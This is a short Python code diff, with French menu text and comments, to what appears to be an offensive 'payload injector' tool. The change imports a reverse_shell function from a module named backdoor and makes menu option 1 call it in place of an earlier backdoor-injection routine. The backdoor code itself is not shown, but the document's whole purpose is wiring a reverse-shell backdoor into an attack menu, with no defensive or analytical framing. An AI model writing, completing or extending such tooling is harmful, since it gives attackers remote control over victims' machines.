@@ -1,3 +1,5 @@
+from backdoor import reverse_shell
+
 def payload_injector():
     while True:
         print("Menu Injecteur de Payload")
@@ -9,7 +11,7 @@ def payload_injector():
         if choix_payload == '1':
             # Nous devons nous assurer que la fonction pour injecter la backdoor est importée.
             # from backdoor import main as inject_backdoor
-            inject_backdoor()
+            reverse_shell()
         elif choix_payload == '2':
             print("Autres types de payloads seront bientôt disponibles...")
         elif choix_payload == '3':
